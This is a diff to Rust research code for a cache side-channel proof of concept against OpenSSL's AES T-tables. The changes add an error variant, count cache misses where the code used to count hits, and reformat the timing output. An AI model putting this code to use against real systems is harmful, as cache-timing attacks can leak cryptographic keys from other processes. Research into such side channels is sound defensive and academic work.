@@ -2,7 +2,7 @@
 
 use openssl::aes;
 
-use crate::CacheStatus::Hit;
+use crate::CacheStatus::{Hit, Miss};
 use memmap2::Mmap;
 use openssl::aes::aes_ige;
 use openssl::symm::Mode;
@@ -46,6 +46,7 @@ pub enum ChannelFatalError {
 pub enum SideChannelError {
     NeedRecalibration,
     FatalError(ChannelFatalError),
+    AddressNotReady,
 }
 
 /*
@@ -124,6 +125,7 @@ impl<T: SingleAddrCacheSideChannel> TableCacheSideChannel for T {
                     SideChannelError::FatalError(e) => {
                         return Err(e);
                     }
+                    _ => panic!(),
                 },
             }
         }
@@ -173,6 +175,7 @@ impl<T: MultipleAddrCacheSideChannel> TableCacheSideChannel for T {
                     panic!();
                 }
                 SideChannelError::FatalError(e) => Err(e),
+                _ => panic!(),
             },
             Ok(v) => Ok(v),
         }
@@ -222,7 +225,11 @@ pub fn attack_t_tables_poc(
     side_channel.calibrate(addresses.clone());
 
     for addr in addresses.clone() {
-        timings.insert(addr, HashMap::new());
+        let mut timing = HashMap::new();
+        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
+            timing.insert(b, 0);
+        }
+        timings.insert(addr, timing);
     }
 
     for b in (u8::min_value()..=u8::max_value()).step_by(16) {
@@ -246,7 +253,7 @@ pub fn attack_t_tables_poc(
                 Ok(v) => {
                     //println!("{:?}", v)
                     for (probe, status) in v {
-                        if status == Hit {
+                        if status == Miss {
                             *timings.get_mut(&probe).unwrap().entry(b).or_insert(0) += 1;
                         }
                     }
@@ -258,7 +265,7 @@ pub fn attack_t_tables_poc(
     for probe in addresses {
         print!("{:p}", probe);
         for b in (u8::min_value()..=u8::max_value()).step_by(16) {
-            print!(" {}", timings[&probe][&b]);
+            print!(" {:3}", timings[&probe][&b]);
         }
         println!();
     }
